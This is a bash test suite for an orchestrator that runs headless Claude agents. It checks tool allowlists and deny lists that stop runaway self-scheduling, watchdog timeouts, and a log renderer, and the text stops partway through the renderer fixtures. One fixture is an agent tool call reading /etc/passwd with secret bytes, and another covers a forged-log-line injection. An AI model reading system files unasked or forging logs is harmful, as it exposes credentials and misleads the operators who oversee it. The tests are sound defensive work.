#!/usr/bin/env bash
# Tests for dispatch.sh.
#
# Group 1 (ENG-41 T7): allowed-tools-linear-mcp — verify no stage's allowed-tools
#   list includes mcp__*linear* tool names (A-002 assumption).
# Group 2 (ENG-41 T7): PIPELINE_WRITER env-propagation — verify dispatch.sh
#   overrides parent PIPELINE_WRITER to "agent" when invoking claude -p
#   (A-003 assumption).
# Group 3 (ENG-26 Task 5 / brainstorm D-002): _render_and_capture_stream
#   stream-json renderer fixtures A-E. See block comments above each fixture.

set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

export PIPELINE_DRY_RUN=1
: "${LINEAR_API_KEY:=test-mock-key}"
export LINEAR_API_KEY
export PROJECT_SLUG="${PROJECT_SLUG:-test-slug}"

# ─── Temp dirs ──────────────────────────────────────────────────────────
_TEST_TARGET_DIR="$(mktemp -d)"
_TEST_STUB_DIR="$(mktemp -d)"

_test_assert_temp_path() {
  case "$1" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*) return 0 ;;
    *) printf 'REFUSING: path %q is not a platform temp dir\n' "$1" >&2; exit 99 ;;
  esac
}
_test_assert_temp_path "$_TEST_TARGET_DIR"
_test_assert_temp_path "$_TEST_STUB_DIR"

_test_safe_rm() {
  local path="$1"
  case "$path" in
    /var/folders/*|/tmp/*|/private/var/folders/*|/private/tmp/*)
      rm -rf "$path" ;;
    *)
      printf 'SAFETY: trap refusing rm -rf %q (not a temp dir)\n' "$path" >&2 ;;
  esac
}
trap '_test_safe_rm "$_TEST_STUB_DIR"; _test_safe_rm "$_TEST_TARGET_DIR"' EXIT

# ─── Minimal target-repo scaffold ────────────────────────────────────────
export TARGET_REPO="$_TEST_TARGET_DIR"
mkdir -p "$TARGET_REPO/.pipeline-config/schemas"

jq -n '{
  project: { slug: "test-slug" },
  linear: {
    team_id: "team-test",
    project_id: "proj-test",
    stage_label_prefix: "stage:",
    native_states: { inbox: "Todo", active: "In Progress", done: "Done" },
    workflow_stages: ["brainstorming","planning","implementing","ui","reviewing","qa","building","released"]
  },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$TARGET_REPO/.pipeline-config/config.json"

jq -n '{ labels: {}, states: {} }' > "$TARGET_REPO/.pipeline-config/schemas/linear-ids.json"

export HARNESS_STATE_DIR="$_TEST_STUB_DIR/state"
export PROJECT_STATE_DIR="${HARNESS_STATE_DIR}/${PROJECT_SLUG}"
mkdir -p "$PROJECT_STATE_DIR"
ISSUE_DIR="${PROJECT_STATE_DIR}/ENG-T-COST"
mkdir -p "$ISSUE_DIR"

# ─── Source dispatch.sh (no main due to sentinel) ────────────────────────
# shellcheck source=dispatch.sh
source "$SCRIPT_DIR/dispatch.sh"

# ─── Assertion helpers ───────────────────────────────────────────────────
PASS=0; FAIL=0
fail_at() { printf '  FAIL %s\n      %s\n' "$1" "$2" >&2; FAIL=$((FAIL+1)); }
pass_at() { printf '  PASS %s\n' "$1"; PASS=$((PASS+1)); }

# ─── Group 1: allowed-tools exclude Linear MCP ──────────────────────────
printf '\n--- allowed-tools: no mcp__*linear* in any stage ---\n'

for stage in brainstorming planning implementing ui reviewing qa building released; do
  tools="$(allowed_tools_for "$stage" 2>/dev/null)"
  # Check for any mcp__*linear* substring (case-insensitive match for safety)
  if printf '%s' "$tools" | grep -qi 'mcp__.*linear'; then
    fail_at "stage=$stage: allowed-tools must not include mcp__*linear* tools" \
      "found: $(printf '%s' "$tools" | grep -oi 'mcp__[^,]*linear[^,]*' || true)"
  else
    pass_at "stage=$stage: no mcp__*linear* in allowed-tools"
  fi

  # Both linear.sh paths must be present so harness-self (bin/) and
  # target-symlinked (.pipeline/bin/) layouts both work.
  if ! printf '%s' "$tools" | grep -q 'Bash(bash \.pipeline/bin/linear\.sh:\*)'; then
    fail_at "stage=$stage: missing Bash(bash .pipeline/bin/linear.sh:*) in allowed-tools" \
      "tools=$tools"
  elif ! printf '%s' "$tools" | grep -q 'Bash(bash bin/linear\.sh:\*)'; then
    fail_at "stage=$stage: missing Bash(bash bin/linear.sh:*) in allowed-tools" \
      "tools=$tools"
  else
    pass_at "stage=$stage: both linear.sh paths present (.pipeline/ + harness-self)"
  fi
done

# ENG-49 Gap #1: UI allowlist no longer contains gh pr create.
ui_tools="$(allowed_tools_for ui)"
if [[ "$ui_tools" != *"gh pr create"* ]]; then
  pass_at "ENG-49: ui allowlist drops gh pr create"
else
  fail_at "ENG-49: ui allowlist drops gh pr create" "ui tools: $ui_tools"
fi

# ─── Group 2: PIPELINE_WRITER env propagation ───────────────────────────
printf '\n--- PIPELINE_WRITER=agent propagated to claude -p invocation ---\n'

# Create a stub for 'claude' that captures its environment AND its argv.
ENV_CAPTURE="$_TEST_STUB_DIR/env.capture"
ARGV_CAPTURE="$_TEST_STUB_DIR/argv.capture"
: > "$ENV_CAPTURE"
: > "$ARGV_CAPTURE"

cat > "$_TEST_STUB_DIR/claude" <<SH
#!/usr/bin/env bash
# Stub: capture PIPELINE_WRITER from the environment, capture argv (one arg
# per line) for ENG-48 isolation-flag assertions, then exit 0.
printf 'PIPELINE_WRITER=%s\n' "\${PIPELINE_WRITER:-<unset>}" >> "$ENV_CAPTURE"
printf '%s\n' "\$@" > "$ARGV_CAPTURE"
# Consume stdin (like real claude would) so the caller's pipe doesn't break.
cat > /dev/null
exit 0
SH
chmod +x "$_TEST_STUB_DIR/claude"

# ENG-48 watchdog: the production cmd wraps claude with `gtimeout
# --signal=TERM --kill-after=10 <seconds> claude ...`. Provide a thin
# pass-through stub so the existing claude stub still receives the inner
# argv unchanged for Group 2 / Group 4 assertions.
cat > "$_TEST_STUB_DIR/gtimeout" <<'SH'
#!/usr/bin/env bash
# Skip --signal=…, --kill-after=… flags, then the seconds arg, then exec
# the inner command.
while (( $# > 0 )); do
  case "$1" in
    --signal=*|--kill-after=*) shift ;;
    *) break ;;
  esac
done
# Next arg is the timeout in seconds — eat it.
if [[ "${1:-}" =~ ^[0-9]+$ ]]; then shift; fi
exec "$@"
SH
chmod +x "$_TEST_STUB_DIR/gtimeout"

# Create a minimal prompt file.
_PROMPT_FILE="$_TEST_STUB_DIR/test-prompt.txt"
printf 'test prompt\n' > "$_PROMPT_FILE"

# Override PATH so our stub 'claude' is found first.
# Also set PIPELINE_WRITER to a value that must NOT propagate — dispatch.sh
# must override it to "agent" before invoking claude.
OLD_PATH="$PATH"
export PATH="$_TEST_STUB_DIR:$PATH"

# Set a canary value in the parent; dispatch.sh must override it.
export PIPELINE_WRITER="canary-parent-lane"

# Run dispatch main in a subshell to isolate mutex and PATH side effects.
# Set PIPELINE_DRY_RUN=0 (not unset) so dispatch.sh's [[ "$PIPELINE_DRY_RUN" == "1" ]]
# check works correctly under set -euo pipefail without triggering the unbound-var guard.
# Suppress the "dispatching stage=..." log line.
( PIPELINE_DRY_RUN=0 PIPELINE_WRITER="canary-parent-lane" main "brainstorm" "$_PROMPT_FILE" 2>/dev/null ) || true

export PATH="$OLD_PATH"

# Check what PIPELINE_WRITER value the stub saw.
if [[ -f "$ENV_CAPTURE" ]]; then
  captured_val="$(grep '^PIPELINE_WRITER=' "$ENV_CAPTURE" | head -1 | cut -d= -f2 || true)"
else
  captured_val=""
fi

if [[ "$captured_val" == "agent" ]]; then
  pass_at "PIPELINE_WRITER=agent was set in claude -p environment (parent had 'canary-parent-lane')"
else
  fail_at "PIPELINE_WRITER=agent was set in claude -p environment" \
    "claude saw PIPELINE_WRITER='${captured_val:-<nothing captured>}' (parent had 'canary-parent-lane')"
fi

# ─── Group 4 (ENG-48): isolation flags reach claude -p invocation ────────
# A 2026-04-28 wedged tick traced to the operator's superpowers plugin's
# SessionStart hook firing inside `claude -p`. Headless dispatches must
# neutralize user-level config:
#   --setting-sources project,local  → skip ~/.claude (plugins, hooks)
#   --disable-slash-commands         → block skill auto-load
#   --disallowed-tools <list>        → deny platform tools that aren't
#                                       in any stage's allowed-tools list
#                                       and whose call would let the agent
#                                       self-loop (ScheduleWakeup), self-
#                                       coordinate (TodoWrite), enter plan
#                                       mode (EnterPlanMode), etc.
# This group asserts the constructed claude argv carries those flags,
# using the argv capture seeded by the stub above.
printf '\n--- ENG-48: isolation flags reach claude -p invocation ---\n'

# --setting-sources project,local
if grep -Fxq -- '--setting-sources' "$ARGV_CAPTURE" \
   && grep -Fxq -- 'project,local' "$ARGV_CAPTURE"; then
  pass_at "--setting-sources project,local present in claude argv"
else
  fail_at "--setting-sources project,local missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# --disable-slash-commands
if grep -Fxq -- '--disable-slash-commands' "$ARGV_CAPTURE"; then
  pass_at "--disable-slash-commands present in claude argv"
else
  fail_at "--disable-slash-commands missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# --disallowed-tools must list every platform tool that demonstrated or
# could enable a runaway in a headless dispatch. The value follows the
# flag as the next arg.
disallowed_idx="$(grep -nFx -- '--disallowed-tools' "$ARGV_CAPTURE" | head -1 | cut -d: -f1 || true)"
if [[ -z "$disallowed_idx" ]]; then
  fail_at "--disallowed-tools flag missing from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
else
  disallowed_value="$(sed -n "$((disallowed_idx + 1))p" "$ARGV_CAPTURE")"
  # Task / WebFetch deliberately excluded: Task may alias the Agent tool
  # used by ui/review/qa/retrospective stages, and brainstorm's allowed-
  # tools includes WebFetch. Denials win over allows in claude's tool-
  # resolution.
  required_denies=(
    ScheduleWakeup TodoWrite Skill
    EnterPlanMode ExitPlanMode EnterWorktree ExitWorktree
    RemoteTrigger PushNotification
    CronCreate CronDelete CronList Monitor
    WebSearch ToolSearch AskUserQuestion
  )
  missing_denies=()
  for required in "${required_denies[@]}"; do
    grep -qw -- "$required" <<<"$disallowed_value" || missing_denies+=("$required")
  done
  if (( ${#missing_denies[@]} == 0 )); then
    pass_at "--disallowed-tools denies all required platform tools (${#required_denies[@]} entries)"
  else
    fail_at "--disallowed-tools missing required denies" \
      "missing: ${missing_denies[*]} | value: $disallowed_value"
  fi
fi

# Regression: --allowed-tools must STILL appear (the existing per-stage
# allowlist contract from Group 1 must not be silently dropped during
# the isolation-flag refactor).
if grep -Fxq -- '--allowed-tools' "$ARGV_CAPTURE"; then
  pass_at "--allowed-tools regression: per-stage allowlist contract preserved"
else
  fail_at "--allowed-tools regression: flag dropped from claude argv" \
    "argv: $(tr '\n' ' ' < "$ARGV_CAPTURE")"
fi

# ─── Group 5 (ENG-48): wall-clock watchdog wraps claude -p ──────────────
# A dispatch that enters a self-loop (e.g. ScheduleWakeup re-firing) must
# be SIGTERM'd by the orchestrator within a bounded budget — operator
# intervention should never be required to free the run-local lock. The
# wrapper is `gtimeout` (GNU coreutils on macOS via brew); the budget is
# read from config.json::orchestrator.dispatch_timeout_minutes (default
# 30 min = 1800s). The dispatched cmd's exit 124 (gtimeout's SIGTERM
# convention) will be mapped by failure_outcome_for_exit in a separate
# commit.
printf '\n--- ENG-48: gtimeout watchdog wraps claude -p ---\n'

DRYRUN_OUT="$_TEST_STUB_DIR/dryrun.out"
PIPELINE_DRY_RUN=1 \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$DRYRUN_OUT" >/dev/null || true

# ENG-65: brainstorming/planning have a 60-min built-in default; other stages
# stay at the historical 30-min cap. No config overrides → 3600s for brainstorm.
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT"; then
  pass_at "dry-run log: gtimeout wrapper with brainstorming built-in default (60-min / 3600s)"
else
  fail_at "dry-run log missing gtimeout wrapper or brainstorming built-in default" \
    "log: $(cat "$DRYRUN_OUT")"
fi

# --signal=TERM and --kill-after=10 must both be present so the wrapper
# escalates from SIGTERM to SIGKILL after 10s if the dispatched claude
# refuses to exit (defensive escalation, not the common case).
if grep -qE 'gtimeout.*--signal=TERM' "$DRYRUN_OUT" \
   && grep -qE 'gtimeout.*--kill-after=10' "$DRYRUN_OUT"; then
  pass_at "dry-run log: gtimeout uses --signal=TERM --kill-after=10 escalation"
else
  fail_at "dry-run log missing gtimeout signal/kill-after escalation flags" \
    "log: $(cat "$DRYRUN_OUT")"
fi

# Custom budget — when orchestrator.dispatch_timeout_minutes is overridden
# (e.g. to 5 for a stage that legitimately runs short), the wrapper
# picks it up.
TARGET_REPO_CUSTOM="$_TEST_STUB_DIR/target-custom"
mkdir -p "$TARGET_REPO_CUSTOM/.pipeline-config/schemas"
jq -n '{
  project: { slug: "custom-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5 }
}' > "$TARGET_REPO_CUSTOM/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_CUSTOM/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_C="$_TEST_STUB_DIR/dryrun-custom.out"
PIPELINE_DRY_RUN=1 \
TARGET_REPO="$TARGET_REPO_CUSTOM" \
PROJECT_SLUG="custom-slug" \
HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
PROJECT_STATE_DIR="$HARNESS_STATE_DIR/custom-slug" \
LINEAR_API_KEY="$LINEAR_API_KEY" \
  bash "$SCRIPT_DIR/dispatch.sh" brainstorming "$_PROMPT_FILE" 2>"$DRYRUN_OUT_C" >/dev/null || true

if grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_C"; then
  pass_at "dry-run log honors config orchestrator.dispatch_timeout_minutes=5 (300s)"
else
  fail_at "dry-run log did not pick up custom dispatch_timeout_minutes" \
    "log: $(cat "$DRYRUN_OUT_C")"
fi

# ─── ENG-65 per-stage timeout fixtures ────────────────────────────────────
# D-002: a per-stage override beats the global, mis-keyed/zero entries fall
# through to the per-stage built-in default, and built-in defaults are 60-min
# for brainstorming/planning and 30-min for everything else.

_eng65_run_dispatch_dryrun() {
  # $1 = target_repo, $2 = project_slug, $3 = stage, $4 = output file
  local _t="$1" _slug="$2" _stage="$3" _out="$4"
  PIPELINE_DRY_RUN=1 \
  TARGET_REPO="$_t" \
  PROJECT_SLUG="$_slug" \
  HARNESS_STATE_DIR="$HARNESS_STATE_DIR" \
  PROJECT_STATE_DIR="$HARNESS_STATE_DIR/$_slug" \
  LINEAR_API_KEY="$LINEAR_API_KEY" \
    bash "$SCRIPT_DIR/dispatch.sh" "$_stage" "$_PROMPT_FILE" 2>"$_out" >/dev/null || true
}

# Per-stage override fixture — brainstorming gets 45 min (2700s), other stages
# unaffected (ui still uses its 30-min built-in default = 1800s).
TARGET_REPO_PERSTAGE="$_TEST_STUB_DIR/target-perstage"
mkdir -p "$TARGET_REPO_PERSTAGE/.pipeline-config/schemas"
jq -n '{
  project: { slug: "perstage-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 45 } }
}' > "$TARGET_REPO_PERSTAGE/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_PERSTAGE/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_PS_BS="$_TEST_STUB_DIR/dryrun-perstage-bs.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PERSTAGE" "perstage-slug" brainstorming "$DRYRUN_OUT_PS_BS"
if grep -qE 'gtimeout.*\b2700\b' "$DRYRUN_OUT_PS_BS"; then
  pass_at "ENG-65 per-stage override: brainstorming honors dispatch_timeout_minutes_per_stage=45 (2700s)"
else
  fail_at "ENG-65 per-stage override did not apply to brainstorming" \
    "log: $(cat "$DRYRUN_OUT_PS_BS")"
fi

DRYRUN_OUT_PS_UI="$_TEST_STUB_DIR/dryrun-perstage-ui.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_PERSTAGE" "perstage-slug" ui "$DRYRUN_OUT_PS_UI"
if grep -qE 'gtimeout.*\b1800\b' "$DRYRUN_OUT_PS_UI"; then
  pass_at "ENG-65 per-stage override: ui untouched by brainstorming override (1800s built-in default)"
else
  fail_at "ENG-65 per-stage override leaked into ui" \
    "log: $(cat "$DRYRUN_OUT_PS_UI")"
fi

# Fallthrough fixture — no per-stage map, but global override is 5 min (300s).
TARGET_REPO_FT="$_TEST_STUB_DIR/target-fallthrough"
mkdir -p "$TARGET_REPO_FT/.pipeline-config/schemas"
jq -n '{
  project: { slug: "ft-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes: 5 }
}' > "$TARGET_REPO_FT/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_FT/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_FT="$_TEST_STUB_DIR/dryrun-ft.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_FT" "ft-slug" brainstorming "$DRYRUN_OUT_FT"
if grep -qE 'gtimeout.*\b300\b' "$DRYRUN_OUT_FT"; then
  pass_at "ENG-65 fallthrough: brainstorming uses global dispatch_timeout_minutes=5 when per-stage absent (300s)"
else
  fail_at "ENG-65 fallthrough did not pick up global override" \
    "log: $(cat "$DRYRUN_OUT_FT")"
fi

# Built-in-default-by-stage fixture — no overrides at all; brainstorming and
# planning land at 60 min (3600s); ui/implementing/qa land at 30 min (1800s).
TARGET_REPO_BI="$_TEST_STUB_DIR/target-builtin"
mkdir -p "$TARGET_REPO_BI/.pipeline-config/schemas"
jq -n '{
  project: { slug: "bi-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5 }
}' > "$TARGET_REPO_BI/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_BI/.pipeline-config/schemas/linear-ids.json"

for stage in brainstorming planning; do
  out="$_TEST_STUB_DIR/dryrun-bi-$stage.out"
  _eng65_run_dispatch_dryrun "$TARGET_REPO_BI" "bi-slug" "$stage" "$out"
  if grep -qE 'gtimeout.*\b3600\b' "$out"; then
    pass_at "ENG-65 built-in default: $stage uses 60-min (3600s) when no overrides set"
  else
    fail_at "ENG-65 built-in default for $stage" "log: $(cat "$out")"
  fi
done

for stage in ui implementing qa; do
  out="$_TEST_STUB_DIR/dryrun-bi-$stage.out"
  _eng65_run_dispatch_dryrun "$TARGET_REPO_BI" "bi-slug" "$stage" "$out"
  if grep -qE 'gtimeout.*\b1800\b' "$out"; then
    pass_at "ENG-65 built-in default: $stage uses 30-min (1800s) when no overrides set"
  else
    fail_at "ENG-65 built-in default for $stage" "log: $(cat "$out")"
  fi
done

# Zero-rejection fixture — `dispatch_timeout_minutes_per_stage.brainstorming = 0`
# would disable the gtimeout watchdog (gtimeout's "no timeout" sentinel).
# The (( minutes >= 1 )) guard restores the per-stage built-in default.
TARGET_REPO_ZERO="$_TEST_STUB_DIR/target-zero"
mkdir -p "$TARGET_REPO_ZERO/.pipeline-config/schemas"
jq -n '{
  project: { slug: "zero-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: 0 } }
}' > "$TARGET_REPO_ZERO/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_ZERO/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_ZERO="$_TEST_STUB_DIR/dryrun-zero.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_ZERO" "zero-slug" brainstorming "$DRYRUN_OUT_ZERO"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_ZERO" \
   && ! grep -qE 'gtimeout.*\b0\b' "$DRYRUN_OUT_ZERO"; then
  pass_at "ENG-65 zero-rejection: brainstorming with per-stage=0 falls back to 60-min built-in (3600s, NOT 0)"
else
  fail_at "ENG-65 zero-rejection failed (watchdog would be disabled)" \
    "log: $(cat "$DRYRUN_OUT_ZERO")"
fi

# Typo'd-key fixture — `brainstorm` (missing -ing) silently falls through to
# the per-stage built-in default. Documented behavior so operators learn to
# verify `gtimeout ... <seconds>` in the per-stage transcript after applying
# their override.
TARGET_REPO_TYPO="$_TEST_STUB_DIR/target-typo"
mkdir -p "$TARGET_REPO_TYPO/.pipeline-config/schemas"
jq -n '{
  project: { slug: "typo-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorm: 45 } }
}' > "$TARGET_REPO_TYPO/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_TYPO/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_TYPO="$_TEST_STUB_DIR/dryrun-typo.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_TYPO" "typo-slug" brainstorming "$DRYRUN_OUT_TYPO"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_TYPO"; then
  pass_at "ENG-65 typo'd-key: brainstorming ignores 'brainstorm' (missing -ing) → 60-min built-in (3600s)"
else
  fail_at "ENG-65 typo'd-key did not fall through to built-in default" \
    "log: $(cat "$DRYRUN_OUT_TYPO")"
fi

# Non-numeric override (string "60m" instead of 60) — regex guard rejects, so
# the value falls through to the global, then to the per-stage built-in.
TARGET_REPO_NN="$_TEST_STUB_DIR/target-nonnumeric"
mkdir -p "$TARGET_REPO_NN/.pipeline-config/schemas"
jq -n '{
  project: { slug: "nn-slug" },
  linear: { team_id: "t", project_id: "p", stage_label_prefix: "stage:", native_states: { inbox: "Todo", active: "In Progress", done: "Done" }, workflow_stages: [] },
  orchestrator: { paused: false, max_concurrent_features: 2, alert_on_halted_over: 5, dispatch_timeout_minutes_per_stage: { brainstorming: "60m" } }
}' > "$TARGET_REPO_NN/.pipeline-config/config.json"
jq -n '{labels:{},states:{}}' > "$TARGET_REPO_NN/.pipeline-config/schemas/linear-ids.json"

DRYRUN_OUT_NN="$_TEST_STUB_DIR/dryrun-nonnumeric.out"
_eng65_run_dispatch_dryrun "$TARGET_REPO_NN" "nn-slug" brainstorming "$DRYRUN_OUT_NN"
if grep -qE 'gtimeout.*\b3600\b' "$DRYRUN_OUT_NN"; then
  pass_at "ENG-65 non-numeric: \"60m\" string rejected; falls through to 60-min built-in (3600s)"
else
  fail_at "ENG-65 non-numeric did not fall through" \
    "log: $(cat "$DRYRUN_OUT_NN")"
fi

# ─── Group 3: stream-json renderer fixtures (ENG-26 Task 5) ──────────────
# Five fixtures:
#   A — success path: NDJSON with a final `result` event yields the six-field
#       usage file at mode 0600, with no leaked session_id / result text.
#   B — no-result path: NDJSON ends mid-stream; no usage file, soft-fail log.
#   C — malformed-line tolerance: a literal `{not json{` between valid events
#       does not abort the renderer; the result event is still extracted.
#   D — log-forge defense: a `\r[FAKE LOG]` byte in agent text is stripped
#       to a space before reaching renderer stdout (SEC-010).
#   E — dry-run stale-file removal: a pre-existing usage file is removed by
#       the dry-run branch's `rm -f` at function entry (E-04 / D-006).

printf '\n--- _render_and_capture_stream renderer fixtures (A-E) ---\n'

if ! declare -f _render_and_capture_stream >/dev/null 2>&1; then
  fail_at "precondition: _render_and_capture_stream is defined in dispatch.sh" \
          "function not found after sourcing — Task 2 implementation missing"
  printf '\nRESULTS: %d passed, %d failed\n' "$PASS" "$FAIL"
  exit 1
fi

# Renderer needs PIPELINE_DRY_RUN=0 so it actually exercises the code path
# (the dry-run guard short-circuits dispatch::main before the renderer).
PIPELINE_DRY_RUN=0
export PIPELINE_DRY_RUN

# ─── Fixture A: success path ───────────────────────────────────────────────
USAGE_A="$ISSUE_DIR/usage-plan.json"
RAW_A="$ISSUE_DIR/.raw-stream.ndjson.tmp"
rm -f "$USAGE_A" "$RAW_A"
RENDER_OUT_A="$(
  _render_and_capture_stream "$USAGE_A" "$ISSUE_DIR" <<'NDJSON'
{"type":"system","subtype":"init","session_id":"a97ddba2-aaaa-bbbb-cccc-dddddddddddd","model":"claude-opus-4-7[1m]"}
{"type":"assistant","message":{"content":[{"type":"text","text":"hello world"}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Read","input":{"path":"/etc/passwd","SECRET_BYTES":"do-not-log"}}]}}
{"type":"user","message":{"content":[{"type":"tool_result","tool_use_id":"toolu_01abcd1234ef","content":"file contents"}]}}
{"type":"result","total_cost_usd":0.11943025,"usage":{"input_tokens":5,"output_tokens":6,"cache_creation_input_tokens":17419,"cache_read_input_tokens":20773},"modelUsage":{"claude-opus-4-7[1m]":{"inputTokens":5}},"session_id":"a97ddba2-aaaa-bbbb-cccc-dddddddddddd","permission_denials":[],"result":"VERBATIM_FINAL_ASSISTANT_TEXT_DO_NOT_LEAK"}
NDJSON
)"

# Six-field usage file, no leaks.
keys_a="$(jq -r 'keys | sort | join(",")' "$USAGE_A" 2>/dev/null || printf '')"
expected_keys="cache_create,cache_read,cost_usd,model,tokens_in,tokens_out"
mode_a="$(stat -f '%A' "$USAGE_A" 2>/dev/null || stat -c '%a' "$USAGE_A" 2>/dev/null || printf '')"
has_session="$(jq -r 'has("session_id")' "$USAGE_A" 2>/dev/null || printf 'true')"
has_result_text="$(jq -r 'has("result")' "$USAGE_A" 2>/dev/null || printf 'true')"
model_a="$(jq -r '.model' "$USAGE_A" 2>/dev/null || printf '')"

if [[ "$keys_a" == "$expected_keys" ]] \
   && [[ "$mode_a" == "600" ]] \
   && [[ "$has_session" == "false" ]] \
   && [[ "$has_result_text" == "false" ]] \
   && [[ "$model_a" == "claude-opus-4-7[1m]" ]]; then
  pass_at "fixture-A success: six fields, mode 600, no session_id/result leak, model literal preserved"
else
  fail_at "fixture-A success" "keys=$keys_a mode=$mode_a session=$has_session result=$has_result_text model=$model_a"
fi

# Renderer stdout shape — prose lines must NOT be JSON-quoted (jq -r contract).
# Each non-empty line must not begin with a `"` (which is what would happen
# if `jq -nR` ran without `-r`).
prose_unquoted="yes"
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  if [[ "${line:0:1}" == '"' ]]; then
    prose_unquoted="no:$line"
    break
  fi
done <<<"$RENDER_OUT_A"

if   [[ "$prose_unquoted" == "yes" ]] \
  && grep -q '\[claude\] session=a97ddba2'      <<<"$RENDER_OUT_A" \
  && grep -q 'hello world'                       <<<"$RENDER_OUT_A" \
  && grep -q '\[tool\] Read'                     <<<"$RENDER_OUT_A" \
  && grep -q '\[tool-result\]'                   <<<"$RENDER_OUT_A" \
  && ! grep -q 'SECRET_BYTES'                    <<<"$RENDER_OUT_A" \
  && ! grep -q 'do-not-log'                      <<<"$RENDER_OUT_A" \
  && ! grep -q 'VERBATIM_FINAL_ASSISTANT_TEXT'   <<<"$RENDER_OUT_A"; then
  pass_at "fixture-A stdout: prose lines emitted unquoted, tool_use input bytes never logged (SEC-001)"
else
  fail_at "fixture-A stdout" "unquoted=$prose_unquoted out=$RENDER_OUT_A"
fi

# Renderer stdout shape — raw vs JSON-quoted (D-002 / F3 contract).
# `jq -n` without `-r` emits string outputs as JSON-encoded values, so
# `[claude] session=...` becomes `"[claude] session=..."` (literal
# surrounding double-quote bytes) on stdout. The downstream
# `tee "$log_file"` then captures JSON-quoted prose, breaking the
# brainstorm's "prose-ish progress lines on STDOUT" contract.
# Catch the regression by asserting no prose line begins with `"`.
if ! grep -qE '^"' <<<"$RENDER_OUT_A"; then
  pass_at "fixture-A stdout: prose lines emitted raw, not JSON-quoted (D-002 / F3)"
else
  fail_at "fixture-A stdout JSON-quoted" "rendered prose line starts with '\"' (missing -r flag on jq?); first offending=$(grep -m1 -E '^"' <<<"$RENDER_OUT_A")"
fi

# Intermediate raw-capture cleaned by RETURN trap.
if [[ ! -e "$RAW_A" ]]; then
  pass_at "fixture-A trap: .raw-stream.ndjson.tmp removed on RETURN"
else
  fail_at "fixture-A trap" "raw_capture still exists: $RAW_A"
fi

# ─── Fixture B: no result event (mid-stream end) ──────────────────────────
USAGE_B="$ISSUE_DIR/usage-plan-B.json"
rm -f "$USAGE_B" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
RENDER_OUT_B="$(
  _render_and_capture_stream "$USAGE_B" "$ISSUE_DIR" 2>&1 <<'NDJSON'
{"type":"system","subtype":"init","session_id":"deadbeef-no-result","model":"claude-opus-4-7"}
{"type":"assistant","message":{"content":[{"type":"text","text":"partial"}]}}
NDJSON
)"

if [[ ! -e "$USAGE_B" ]] && grep -q 'no result event found in stream' <<<"$RENDER_OUT_B"; then
  pass_at "fixture-B no-result: usage file not written; soft-fail warning logged"
else
  fail_at "fixture-B no-result" "exists=$([[ -e $USAGE_B ]] && echo y || echo n) out=$RENDER_OUT_B"
fi

# ─── Fixture C: malformed line tolerance ───────────────────────────────────
USAGE_C="$ISSUE_DIR/usage-plan-C.json"
rm -f "$USAGE_C" "$ISSUE_DIR/.raw-stream.ndjson.tmp"
_render_and_capture_stream "$USAGE_C" "$ISSUE_DIR" >/dev/null 2>&1 <<'NDJSON'
